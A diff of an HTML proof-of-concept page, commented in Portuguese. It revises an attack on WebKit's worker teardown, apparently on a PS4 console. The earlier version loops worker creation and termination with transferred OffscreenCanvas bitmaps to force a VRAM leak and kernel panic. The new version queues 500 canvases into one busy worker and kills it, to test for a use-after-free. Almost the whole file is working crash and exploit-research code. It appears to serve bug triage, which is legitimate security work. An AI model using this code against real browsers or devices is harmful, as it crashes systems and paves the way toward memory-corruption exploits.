@@ -2,38 +2,54 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PoC - OffscreenCanvas IPC Teardown Leak</title>
+    <title>PoC - The Single Worker IPC Teardown</title>
+    <style>
+        body { background-color: #0d0d0d; color: #0f0; font-family: monospace; padding: 20px; }
+        button { background-color: #222; color: #0f0; border: 1px solid #0f0; padding: 15px; font-size: 16px; cursor: pointer; width: 100%; }
+        button:hover { background-color: #333; }
+    </style>
 </head>
 <body>
-    <h2>OffscreenCanvas IPC Teardown 10ms</h2>
-    <div id="log" style="font-family: monospace; font-size: 16px; background: #000; color: #0f0; padding: 10px;">Iniciando...</div>
+    <h2>O Tira-Teimas: Queue Teardown vs DoS</h2>
+    <p>Este teste cria apenas 1 Worker. Ele envia 500 Canvas para a fila desse Worker de uma só vez e o destrói instantaneamente.</p>
+    
+    <button onclick="triggerSingleWorkerCrash()">[ EXECUTAR ] Disparar Colisão Única</button>
+    
+    <div id="log" style="margin-top: 20px;">Aguardando...</div>
 
     <script>
-        const logEl = document.getElementById('log');
-        // Worker vazio. A falha não é no código do worker, mas na destruição do seu contexto IPC.
-        const workerCode = `onmessage = () => {};`;
-        const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
-        
-        let count = 0;
-        
-        // Loop conservador de 100ms: Garante que NUNCA há mais de 1 Worker ativo no sistema,
-        // descartando completamente qualquer alegação de Thread Exhaustion.
-        setInterval(() => {
+        function log(msg) {
+            document.getElementById('log').innerText += "\\n" + msg;
+        }
+
+        function triggerSingleWorkerCrash() {
+            log("[*] Criando 1 único Worker...");
+            const workerCode = `onmessage = () => { /* Faz o worker ficar ocupado */ let x = 0; while(x < 100000000) x++; };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
             const w = new Worker(url);
-            const canvas = new OffscreenCanvas(128, 128);
-            const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
             
-            // 1. O WebKit mapeia a memória física e envia o ponteiro para a fila nativa do Worker
-            try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+            // Acorda o worker e o deixa ocupado
+            w.postMessage("start"); 
+
+            log("[*] Gerando 500 OffscreenCanvas e enviando para a fila IPC (VRAM em trânsito)...");
             
-            // 2. A aniquilação imediata impede o Garbage Collector normal e 
-            // falha em libertar o descritor de VRAM no driver da GPU do PS4.
+            for(let i = 0; i < 500; i++) {
+                try {
+                    const canvas = new OffscreenCanvas(64, 64);
+                    const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                    w.postMessage({c: transferred}, [transferred]);
+                } catch(e) {}
+            }
+
+            log("[!] Fila cheia. Executando w.terminate() na thread nativa...");
+            
+            // O GATILHO: O Worker morre. O C++ do WebKit tem de ir à fila de mensagens
+            // que acabou de receber 500 ponteiros de VRAM e tentar limpá-la.
             w.terminate(); 
             
-            count++;
-            logEl.innerText = `Iterações de vazamento de IPC/VRAM: ${count}\nAguarde o Kernel Panic (~300)...`;
-            
-        }, 10);
+            log("[+] Comando enviado. Se o console der Kernel Panic agora, o bug é Crítico (Queue Teardown UAF).");
+            log("[-] Se o console sobreviver, os crashs anteriores eram puramente DoS (Thread Exhaustion).");
+        }
     </script>
 </body>
 </html>
